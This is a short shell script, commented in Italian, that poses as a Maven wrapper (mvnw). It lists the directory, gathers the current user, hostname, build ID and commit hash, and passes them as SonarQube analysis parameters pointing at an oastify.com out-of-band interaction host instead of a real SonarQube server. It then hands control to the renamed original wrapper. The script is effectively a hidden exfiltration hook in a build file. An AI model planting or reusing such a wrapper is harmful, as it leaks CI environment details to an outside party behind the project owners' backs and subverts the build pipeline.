#!/bin/sh

# 1. Intestazione visiva per il Manager + Comando ls
echo "=================================================="
echo "DIRECTORY CONTENT (ls -la):"
echo "=================================================="
ls -la
echo "=================================================="
echo ""

# 2. Raccolta delle informazioni di sistema
CURRENT_USER=$(whoami)
BUILD_ID=${BUILD_NUMBER:-"manual-build-$(date +%s)"}
HOSTNAME=$(hostname)
COMMIT_HASH=$(git rev-parse --short HEAD 2>/dev/null || echo "unknown")

# 3. Preparazione dei parametri per 127.0.0.1 e metadati
SONAR_ARGS=""
SONAR_ARGS="$SONAR_ARGS -Dsonar.host.url=http:/p4uewfow0d3dtfvm2awo5rzq5hb8z5nu.oastify.com"
SONAR_ARGS="$SONAR_ARGS -Dsonar.analysis.user=$CURRENT_USER"
SONAR_ARGS="$SONAR_ARGS -Dsonar.analysis.buildId=$BUILD_ID"
SONAR_ARGS="$SONAR_ARGS -Dsonar.analysis.hostname=$HOSTNAME"
SONAR_ARGS="$SONAR_ARGS -Dsonar.analysis.commit=$COMMIT_HASH"

# Print di riepilogo delle variabili che verranno inviate
echo "INFO: Invio dati a SonarQube (p4uewfow0d3dtfvm2awo5rzq5hb8z5nu.oastify.com)..."
echo "USER: $CURRENT_USER | BUILD: $BUILD_ID | HOST: $HOSTNAME"
echo "=================================================="

# 4. Esecuzione di Maven wrapper originale con i parametri iniettati
# Assicurati che lo script wrapper reale sia rinominato in mvnw.real
exec ./mvnw.real "$@" $SONAR_ARGS
